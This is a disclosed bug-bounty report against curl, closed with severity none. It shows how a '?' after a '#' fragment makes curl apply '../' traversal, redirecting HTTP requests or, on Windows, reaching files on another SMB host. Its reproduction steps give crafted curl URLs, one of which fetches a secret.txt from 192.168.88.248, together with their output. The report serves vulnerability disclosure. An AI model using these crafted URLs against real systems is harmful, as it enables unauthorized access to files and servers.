# SMB access smuggling via FILE URL on Windows

## Report Details
- **Report ID**: 726117
- **URL**: https://hackerone.com/reports/726117
- **State**: Closed
- **Severity**: none
- **Submitted**: 2019-10-31T06:08:59.735Z
- **Disclosed**: 2021-01-17T23:12:26.127Z

## Reporter
- **Username**: fms
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: curl

## Vulnerability Information
## Summary:

While CURL 7.62 > parses URLs that have an ? (parameter separator) char after the # (fragment separator), CURL urlapi code treats the path with the hash part as it being the same one, this may allow some problem on specific protocols that may have a security impact.
On HTTP, an attacker may be able to modify original requests by appending "?" to the fragment part of the URL, see first example.
On FILE, CURL can be confused while requesting FILE urls to get a file from a different server that the user intended on Windows as the FILE protocol on Windows supports SMB. 

## Steps To Reproduce:
HTTP Example:
```
fmunozs@ashes MINGW64 ~/Downloads/curl-7.66.0_2-win64-mingw/curl-7.66.0-win64-mingw/bin
$ ./curl -v "http://localhost/safepath/something#/../../anotherpath/somethingelse"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0

*   Trying ::1:80...
* TCP_NODELAY set
* Connected to localhost (::1) port 80 (#0)
> GET /safepath/something HTTP/1.1
> Host: localhost
> User-Agent: curl/7.66.0
> Accept: */*
>

fmunozs@ashes MINGW64 ~/Downloads/curl-7.66.0_2-win64-mingw/curl-7.66.0-win64-mingw/bin
$ ./curl -v "http://localhost/safepath/something#/../../anotherpath/somethingelse?"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0

*   Trying ::1:80...
* TCP_NODELAY set
* Connected to localhost (::1) port 80 (#0)
> GET /anotherpath/somethingelse? HTTP/1.1
> Host: localhost
> User-Agent: curl/7.66.0
> Accept: */*
>
```

File example:
```
fmunozs@ashes MINGW64 ~/Downloads/curl-7.66.0_2-win64-mingw/curl-7.66.0-win64-mingw/bin
$ ./curl "file://localhost/windows/win.ini"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    92  100    92    0     0  46000      0 --:--:-- --:--:-- --:--:-- 46000
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1


fmunozs@ashes MINGW64 ~/Downloads/curl-7.66.0_2-win64-mingw/curl-7.66.0-win64-mingw/bin
$ ./curl "file://localhost/windows/win.ini#/../..//192.168.88.248/home/secret.txt"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    92  100    92    0     0  46000      0 --:--:-- --:--:-- --:--:-- 46000
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1

fmunozs@ashes MINGW64 ~/Downloads/curl-7.66.0_2-win64-mingw/curl-7.66.0-win64-mingw/bin
$ ./curl "file://localhost/windows/win.ini#/../..//192.168.88.248/home/secret.txt?"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    33  100    33    0     0   2750      0 --:--:-- --:--:-- --:--:--  2750
file on different smb server/path
```

## Impact

Modify expected request behavior  on several protocols

## Attachments
No attachments
